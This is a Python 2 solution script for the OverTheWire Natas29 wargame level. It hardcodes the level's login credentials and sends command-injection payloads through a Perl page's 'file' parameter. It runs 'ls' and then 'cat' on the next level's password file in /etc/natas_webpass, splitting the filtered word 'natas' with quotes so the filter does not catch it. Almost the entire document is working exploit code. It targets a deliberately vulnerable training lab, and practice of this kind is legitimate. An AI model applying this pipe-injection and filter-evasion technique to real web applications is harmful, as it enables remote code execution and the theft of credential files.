# Natas29 python solution
# By Emil 'Dota' Bak, 2019

import requests

# ***********************************************
URL     = "http://natas29.natas.labs.overthewire.org/"

auth_name = 'natas29'
auth_pass = 'airooCaiseiyee8he8xongien9euhe8b'

s      = requests.Session()
s.auth = (auth_name,auth_pass)
# ***********************************************

# By chaining a command (via |) a user can get remote code-execution
ls_test = "|ls%00"
#r = s.get(URL+"index.pl?file="+payload)
#print r.text

# As code injection is possible, the remaining challenge is to 'cat' the
# password file from the server. As certain
# detections are in place, numerous workarounds has to be used (%22 etc.)
payload = "|cat+%22/etc/nat%22%22as_webpass/nat%22%22as30%22|tr+%27\n%27+%27+%27"

r = s.get(URL+"index.pl?file="+payload)

# Had to match part of the password for this one
# to pretty print
for x in r.iter_lines():
    if "wie" in x:
        print x